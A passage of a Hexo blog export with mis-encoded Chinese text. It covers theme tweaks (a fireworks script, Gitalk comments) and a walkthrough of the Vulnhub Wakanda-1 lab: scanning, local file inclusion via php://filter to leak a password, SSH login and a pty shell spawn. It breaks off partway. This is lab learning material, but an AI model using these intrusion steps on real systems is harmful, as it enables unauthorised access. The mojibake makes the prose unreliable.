punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>Âú®/layout/layout.ejs‰∏≠ÂÜôÂÖ•Ôºö</p><pre class=" language-html"><code class="language-html">{% if theme.fireworks %}>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fireworks<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//cdn.bootcss.com/animejs/2.2.0/anime.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/src/fireworks.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>> {% endif %}</code></pre><p>ÁÑ∂ÂêéÔºåÂú®Áõ∏Â∫î‰∏ªÈ¢òÁöÑconfigÊñá‰ª∂Âä†ÂÖ•</p><pre class=" language-shell"><code class="language-shell">fireworks: true</code></pre></blockquote><h2 id="9-ËÆæÁΩÆËØÑËÆ∫ÂäüËÉΩGitment"><a href="#9-ËÆæÁΩÆËØÑËÆ∫ÂäüËÉΩGitment" class="headerlink" title="9.ËÆæÁΩÆËØÑËÆ∫ÂäüËÉΩGitment"></a>9.ËÆæÁΩÆËØÑËÆ∫ÂäüËÉΩGitment</h2><blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb852eb79447.png" class="lazyload"></p><p>owner githubÁî®Êà∑ÂêçÔºårepoÂ≠òÂÇ®ËØÑËÆ∫ÁöÑ‰ªìÂ∫ìÔºåclientIdÂíåclientSecretÈúÄË¶ÅËá™Â∑±Ê≥®ÂÜågithub app</p><p><a href="https://github.com/settings/applications" target="_blank" rel="noopener">https://github.com/settings/applications</a></p><p>ÂàáËÆ∞Authorization callback URL Ë¶ÅÂ°´ÂÜôCNAMEËß£ÊûêÁöÑÂüüÂêçÔºàÊú™Ëß£ÊûêÂàôÂ°´ÈªòËÆ§githubÁöÑÂüüÂêçÔºâÔºåÂê¶ÂàôÂèØËÉΩÊó†Ê≥ï‰ΩøÁî®</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb8533843b56.png" class="lazyload"></p><p>ÁÑ∂ÂêéÂáÑÊÉ®Âú∞ÂèëÁé∞‰ΩúËÄÖÊúçÂä°ÂÅúÊ≠¢‰∫ÜÔºåÂèÇËÄÉ<a href="https://www.jianshu.com/p/f2f4c802914b" target="_blank" rel="noopener">https://www.jianshu.com/p/f2f4c802914b</a></p></blockquote><h2 id="10-Ê∑ªÂä†ÁõÆÂΩï"><a href="#10-Ê∑ªÂä†ÁõÆÂΩï" class="headerlink" title="10.Ê∑ªÂä†ÁõÆÂΩï"></a>10.Ê∑ªÂä†ÁõÆÂΩï</h2><blockquote><p>Âú®‰∏ªÈ¢òÁöÑÊ®°ÊùøÊñá‰ª∂ÔºåÊâæÂà∞ÊñáÁ´†ÂÜÖÂÆπÊ®°ÊùøÔºåÂ∞ÜÂÖ∂ÊèíÂÖ•Âú®ÂÜÖÂÆπÂâçÈù¢Âç≥ÂèØ„ÄÇ</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>%- toc<span class="token punctuation">(</span>page.content, <span class="token punctuation">{</span>        class: <span class="token string">'post-toc'</span>,        list_number: <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span> %<span class="token operator">></span></code></pre></blockquote><h2 id="11-Ê∑ªÂä†Gitalk"><a href="#11-Ê∑ªÂä†Gitalk" class="headerlink" title="11.Ê∑ªÂä†Gitalk"></a>11.Ê∑ªÂä†Gitalk</h2><blockquote><p>Â∑≤ÁªèÈõÜÊàê‰∫ÜGitalkÁöÑ‰∏ªÈ¢òÊåâÂ¶Ç‰∏ãÈÖçÁΩÆÂç≥ÂèØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc2cd32b93d9.png" class="lazyload"></p><p>ownerÂ∞±ÊòØÁî®Êà∑ÂêçÔºårepoÊòØ‰ªìÂ∫ìÂêçÔºåËá≥‰∫éclientIDÔºåclientSecretÔºåÈúÄË¶ÅËá™Ë°åÁî≥ËØ∑ÂàõÂª∫ OAuth applications„ÄÇËØÑËÆ∫ÈúÄË¶ÅÊ∂âÂèä GitHub ÊéàÊùÉÁôªÂΩïÔºåÊâÄ‰ª•Âú®ËøôÈáå‰Ω†ÂÖàË¶ÅÊúâ‰∏Ä‰∏™ GitHub application„ÄÇGitHub ÊéàÊùÉÁôªÂΩïÈÅµÂæ™ <a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">OAuth 2.0 Ê†áÂáÜ</a>„ÄÇOAuth applications ÂàõÂª∫Â¶Ç‰∏ãÂõæÊâÄÁ§∫ÔºåÂ°´ÂÜô‰∏äÈù¢Áõ∏Â∫îÁöÑÂÜÖÂÆπ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc2ceac7ef32.png" class="lazyload"></p></blockquote><h2 id="Gitalk-Êä•Èîô-redirectÈóÆÈ¢ò"><a href="#Gitalk-Êä•Èîô-redirectÈóÆÈ¢ò" class="headerlink" title="Gitalk Êä•Èîô redirectÈóÆÈ¢ò"></a>Gitalk Êä•Èîô redirectÈóÆÈ¢ò</h2><blockquote><p>Áî±‰∫é‰πãÂâçÂÜôÁöÑauthorization callback url ‰∏∫httpÂçèËÆÆÂºÄÂ§¥ÔºåÁÑ∂ÂêéÂèàÂºÄÂêØ‰∫ÜgithubÂº∫Âà∂httpsÈÄâÈ°πÔºå‰∫éÊòØ‰ºöÊä•ÈîôÔºåË∑≥ËΩ¨Âà∞È¶ñÈ°µÔºåÂπ∂‰∏îÊó†Ê≥ïÂàùÂßãÂåñÈóÆÈ¢òÔºåËøô‰∏™Êó∂ÂÄôÂè™ÈúÄË¶ÅÊää authorization callback url ÊîπÊàêhttpsÂçèËÆÆÂç≥ÂèØ.</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc418107dc99.png" class="lazyload"></p></blockquote><blockquote><p> ÁªßÁª≠Êõ¥Êñ∞‰∏≠„ÄÇ„ÄÇ„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÊùÇÊñá </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitË¥¶Êà∑ </tag>
            
            <tag> HexoÊê≠Âª∫ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wakanda-1-Èù∂Êú∫Ê∏óÈÄè</title>
      <link href="/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ÂØπwakandaÈù∂Êú∫ÁöÑÊ∏óÈÄè‰πãÊóÖ"><a href="#ÂØπwakandaÈù∂Êú∫ÁöÑÊ∏óÈÄè‰πãÊóÖ" class="headerlink" title="-ÂØπwakandaÈù∂Êú∫ÁöÑÊ∏óÈÄè‰πãÊóÖ"></a>-ÂØπwakandaÈù∂Êú∫ÁöÑÊ∏óÈÄè‰πãÊóÖ</h1><p>‚Äã    ‰ªévulhub‰∏ä‰∏ãËΩΩÈù∂Êú∫ÂêéÔºåÊú¨ÊâìÁÆóÂú®vm‰∏äÊê≠Âª∫ÔºåÂêéÂèëÁé∞ovaÂØºÂÖ•ÊúâÁÇπÈóÆÈ¢òÔºåÊïÖÂú®virtualbox‰∏äÊê≠Âª∫ÊàêÂäüÔºåÊàë‰ª¨ÈúÄË¶ÅËé∑Âæóflag1.txt,flag2.txt,root.txt ‰∏â‰∏™Êñá‰ª∂ÁöÑ‰ø°ÊÅØÔºåÂ∞ÜÊîªÂáªÊú∫ÔºåÈù∂Êú∫ÂùáËÆæ‰∏∫Ê°•Êé•ÁΩëÂç°Ê®°ÂºèÔºåÂõ†‰∏∫ÊàëÁöÑkaliÊòØÂú®vmÈáåÈù¢„ÄÇ</p><p>‚Äã    Èù∂Êú∫‰∏ãËΩΩÂú∞ÂùÄ:<a href="https://www.vulnhub.com/entry/wakanda-1,251/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/</a></p><h2 id="0x00-Ê∏óÈÄèËøáÁ®ã"><a href="#0x00-Ê∏óÈÄèËøáÁ®ã" class="headerlink" title="0x00 Ê∏óÈÄèËøáÁ®ã"></a>0x00 Ê∏óÈÄèËøáÁ®ã</h2><h3 id="1-ÂØπÈù∂Êú∫ÁöÑ‰ø°ÊÅØÊî∂ÈõÜ"><a href="#1-ÂØπÈù∂Êú∫ÁöÑ‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="1.ÂØπÈù∂Êú∫ÁöÑ‰ø°ÊÅØÊî∂ÈõÜ"></a>1.ÂØπÈù∂Êú∫ÁöÑ‰ø°ÊÅØÊî∂ÈõÜ</h3><p>ÊîªÂáªÊú∫Ôºö</p><pre><code>Ëá™Áî®kali--IPÂú∞ÂùÄ:192.168.1.107</code></pre><p>kali netdiscover ÂêØÂä®:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ebe12b5d.png" alt=""></p><p>‚Äã    ÈÇ£‰πàÂèØ‰ª•ÂæóÂà∞Èù∂Êú∫ IP Ôºö192.168.1.108 ÔºåÊó¢ÁÑ∂ÂæóÂà∞‰∫ÜÈù∂Êú∫ipÂú∞ÂùÄÔºåÈÇ£‰πàÊãøÂá∫nmapÁ•ûÂô®ÂØπÂÖ∂ËøõË°å‰∏ÄÊ≥¢Êâ´ÊèèÔºåËé∑ÂæóÊõ¥ËØ¶ÁªÜÁöÑÈù∂Êú∫‰ø°ÊÅØ„ÄÇ</p><pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.1.108</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89ecba4d21.png" alt=""></p><p>‚Äã    Áî±nmapÊâ´ÊèèÂæóÂá∫ÁöÑ‰ø°ÊÅØÔºåÂºÄÂêØ‰∫Ü80Á´ØÂè£ÁöÑwebÊúçÂä°ÔºåÁÑ∂ÂêéÊòØ3333Á´ØÂè£ÁöÑ‰∏Ä‰∏™OpensshÊúçÂä°ÔºåËøôÈáåÈúÄË¶ÅÂÅö‰∏Ä‰∏ãÁ¨îËÆ∞ÔºåsshËøûÊé•ÊòØ3333Á´ØÂè£ËÄå‰∏çÊòØÂ∏∏ËßÑÁöÑ22Á´ØÂè£Âì¶ÔºÅÂÖàÂéª80Á´ØÂè£ËÆøÈóÆ‰∏Ä‰∏ãÁúãÁúãÊÉÖÂÜµÔºö</p><p><img src="https://i.loli.net/2018/10/06/5bb89ed45deb8.png" alt=""></p><p>‚Äã    emmm,ÂèëÁé∞Â∞±‰∏Ä‰∏™ÊôÆÈÄöÈ°µÈù¢Âï•‰πüÊ≤°ÊúâÔºåÂè™Êúâ‰∏Ä‰∏™Áúã‰ººÊúâÁî®ÁöÑ Made by@mamadou ???ÈöæÈÅìÊòØ‰∏™Áî®Êà∑ÂêçËøòÊòØ‰∏™ÂØÜÁ†ÅÂï•ÁöÑÔºüÂÖàÂÅöÁ¨îËÆ∞ËÆ∞‰∏Ä‰∏ãÔºåËêåÊñ∞Â∞±ÊòØ‰ªÄ‰πàÈÉΩË¶ÅÂÅöÁ¨îËÆ∞ÔºåÊé•‰∏ãÊù•Êâ´‰∏Ä‰∏ãÁõÆÂΩïÁúãÁúã:</p><p><img src="https://i.loli.net/2018/10/06/5bb89edbcd18b.png" alt=""></p><p>‚Äã    Êâ´Âà∞Âá†‰∏™È°µÈù¢Ôºå‰ΩÜÊòØË≤å‰ººSIZEÈÉΩÊòØ0ÔºåË¢´CTFÂêÑÁßçËôêÁöÑÊàëËøòÊòØÈÄâÊã©ÂéªÁúãÁúãÈ°µÈù¢ÈáåÊúâÊ≤°Êúâ‰∏úË•ø„ÄÇ==&gt;ËΩ¨‰∫Ü‰∏ÄÂúàÂèëÁé∞Á°ÆÂÆûÊòØÁ©∫ÁöÑÔºåÈÇ£ÂíãÂäûÔºåÈöæÈÅìÊ∏óÈÄè‰πãÊóÖÂà∞Ê≠§ÁªìÊùüÔºü‰ªîÁªÜÊÉ≥‰∫ÜÂá†ÂàÜÈíüÔºåÊó¢ÁÑ∂Âè™Êúâ‰∏Ä‰∏™È°µÈù¢ÔºåÂøòËÆ∞ÁúãÊ∫êÁ†Å‰∫ÜÔºåÊ∫êÁ†ÅÂ¶Ç‰∏ã:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ee81c834.png" alt=""></p><p>‚Äã    ËøôÁªøÁöÑÊàëÂèëÊÖåÁöÑ‰∏Ä‰∏≤Ê≥®ÈáäÔºå‰∏çÁî®Áõ¥ËßâÊàëÁåú‰πüÊòØÈù∂Êú∫ÁöÑÂàáÂÖ•ÁÇπ‰∫ÜÔºålangÂèÇÊï∞ÊîπÂèò‰ºöÂΩ±ÂìçÈ°µÈù¢ÁöÑËØ≠Ë®ÄÊòæÁ§∫ÔºåÁåúÊµãÂèØËÉΩÊòØ langÂèÇÊï∞ÊîπÂèò‰∫Ü‰ΩøÁî®ÁöÑËØ≠Ë®ÄphpÊñá‰ª∂ÔºåÈÇ£‰πàÂ∞±ÊòØÂíåÊñá‰ª∂Áõ∏ÂÖ≥ÁöÑÊºèÊ¥ûÂíØÔºÅ</p><p>‚Äã    ‰ΩÜÊòØÂè™ÊúâËøô‰∏Ä‰∏™È°µÈù¢ÔºåÂ∫îËØ•ÂèØ‰ª•Ê£ÄÊµã‰∏Ä‰∏ãËøô‰∏™ÂèÇÊï∞ÊòØÂê¶ÂèØ‰ª•ËøõË°åÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´(Local File Include)ÔºåÂ∞ÜËøôÂîØ‰∏ÄÁöÑ‰∏Ä‰∏™È°µÈù¢ÁöÑÂÆåÊï¥Ê∫êÁ†ÅÁªôËØª‰∏ãÊù•„ÄÇÂà©Áî®‰πãÂâçÂÅöctfËøòÁÆóÊúâ‰∏ÄÁÇπÁÇπÁöÑÁªèÈ™åÔºàÂèÇËÄÉ<a href="https://blog.csdn.net/qq_35544379/article/details/78230629ÔºâÔºåÊàë‰ª¨ÂèØ‰ª•Áî®" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629ÔºâÔºåÊàë‰ª¨ÂèØ‰ª•Áî®</a> php://filter Ëøô‰∏™ÂçèËÆÆÁöÑ‰∏Ä‰∫õÂ∞èÁâπÊÄßÊù•Â∞ÜÊ∫êÁ†Å‰ª•base64ÁöÑÂΩ¢Âºèdown‰∏ãÊù•:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89ef3e3358.png" class="lazyload"></p><p>‚Äã    ÁÑ∂Âêébase64Ëß£Á†ÅÂæóÂà∞Â¶Ç‰∏ãÂÆåÊï¥ÁöÑÊ∫êÁ†ÅÔºö</p><pre><code>&lt;?php$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember itif (isset($_GET[&#39;lang&#39;])){include($_GET[&#39;lang&#39;].&quot;.php&quot;);}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;    &lt;title&gt;Vibranium Market&lt;/title&gt;    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;   &lt;/head&gt;  &lt;body class=&quot;text-center&quot;&gt;    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;      &lt;header class=&quot;masthead mb-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;          &lt;/nav&gt;        &lt;/div&gt;      &lt;/header&gt;      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;?php            if (isset($_GET[&#39;lang&#39;]))          {          echo $message;          }          else          {            ?&gt;            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!            &lt;?php          }?&gt;        &lt;/p&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;        &lt;/p&gt;      &lt;/main&gt;      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;        &lt;/div&gt;      &lt;/footer&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>‚Äã    ohÔºÅgetÂà∞‰∏Ä‰∏™passwordÔºöNiamey4Ever227!!!</p><p>‚Äã    Âà∞Áé∞Âú®ÔºåÊàë‰ª¨Êî∂ÈõÜÂà∞‰∫Ü‰ΩúËÄÖÁöÑÂêçÁß∞ mamadouÔºåÂºÄÊîæÂú®3333Á´ØÂè£ÁöÑsshÊúçÂä°ÔºåÁÑ∂Âêé‰∏Ä‰∏™password„ÄÇ</p><hr><h3 id="2-ÂºÄÂßãÊ∏óÈÄèÈù∂Êú∫"><a href="#2-ÂºÄÂßãÊ∏óÈÄèÈù∂Êú∫" class="headerlink" title="2.ÂºÄÂßãÊ∏óÈÄèÈù∂Êú∫"></a>2.ÂºÄÂßãÊ∏óÈÄèÈù∂Êú∫</h3><p>‚Äã    ‰∫åËØù‰∏çËØ¥ÔºåÁî®sshËØïËØïËøúÁ®ãÁôªÂΩïÈù∂Êú∫Ôºö</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> 192.168.1.108 -l mamadou -p 3333</code></pre><p>‚Äã    ËæìÂÖ•Niamey4Ever227!!!‰Ωú‰∏∫ÂØÜÁ†ÅÁôªÂΩïÔºå‰∏§Áßí‰πãÂêéÔºåÂºπÂá∫Êù•‰∏Ä‰∏™python shellÁïåÈù¢ÔºüËßÅËØÜÁü≠ÊµÖËßÅËØÜÁü≠ÊµÖÔºåËØïËØïÁî®pythonÁöÑptyÊääÂÆåÂÖ®‰∫§‰∫íÂºèÁöÑÁªàÁ´ØÂºÑÂá∫Êù•„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pty <span class="token keyword">import</span> spawn<span class="token operator">>></span><span class="token operator">></span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>mamadou@Wakanda1<span class="token punctuation">:</span><span class="token operator">~</span>$ </code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f067fc33.png" class="lazyload"></p><p>‚Äã    ÈóÆÈ¢ò‰∏çÂ§ßÔºålsÁúã‰∏Ä‰∏ãÁõÆÂΩïÔºåÁúãÂà∞‰∫ÜÊàë‰ª¨Ë¶ÅÊâæÁöÑÁ¨¨‰∏Ä‰∏™flag,‰πüÂ∞±ÊòØflag1.txtÔºåÁÑ∂Âêécat flag1.txt ==&gt; Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</p><p>‚Äã    Êé•‰∏ãÊù•Â∞±ÊòØÊâæ‰∏Ä‰∏ãflag2.txt‰∫ÜÔºåÂà∞‰∏äÁ∫ßÁõÆÂΩïÁúãÂà∞‰∫ÜÂè¶Â§ñ‰∏Ä‰∏™Áî®Êà∑ devops ÁöÑÁõÆÂΩïÔºåËøõÂéªÁúãÁúãÊâæÂà∞‰∫Üflag2.txtÔºå‰ΩÜÊòØÊ≤°ÊúâÊùÉÈôêÔºåÈúÄË¶Å‰ª•devopsÁöÑË∫´‰ªΩÊâìÂºÄ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f0ef1687.png" class="lazyload"></p><p>‚Äã    ÂéªÂà´ÁöÑÁõÆÂΩïÈÄõ‰∏ÄÈÄõÔºåÊûúÁÑ∂/tmpÁõÆÂΩï‰∏ãÊòØÊúâÁÇπ‰∏úË•øÁöÑÔºå‰ΩÜÊòØÂè™ÊòØ‰∏Ä‰∏™testÊñá‰ª∂ÔºåÈáåÈù¢Âê´Êúâ‰∏Ä‰∏™‚Äòtest‚ÄôÂ≠óÁ¨¶‰∏≤ÔºåÂπ∂Ê≤°Êúâ‰ªÄ‰πà‰∏çÂêå„ÄÇ</p><p>‚Äã    ÁúãÁúãË∑üdevopsÊúâÂÖ≥Á≥ªÁöÑÊñá‰ª∂ÊúâÂì™‰∫õ:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f16aa291.png" class="lazyload"></p><p>‚Äã    Á¨¨‰∏Ä‰∏™ËøòÊòØ‰ªÖÊúâÁöÑ‰∏Ä‰∏™Â∞±ÊòØ‰∏Ä‰∏™pythonËÑöÊú¨ÁöÑÊ†∑Â≠êÔºàÂøΩÁï•ÂêéÈù¢ÁöÑsetup.pyÔºåÂõ†‰∏∫ÊòØÂÅöÂÆå‰πãÂêéÂÜôÁöÑÊñáÁ´†Ôºåsetup.pyÊòØÂêéÈù¢ÊàëÂºÑËøõÂéªÁöÑÊñá‰ª∂ÔºâÔºåÁúãÁúã.antivirus.pyÂÜÖÂÆπÊòØÂï•:</p><pre class=" language-python"><code class="language-python">open<span class="token punctuation">(</span><span class="token string">'/tmp/test'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span></code></pre><p>‚Äã    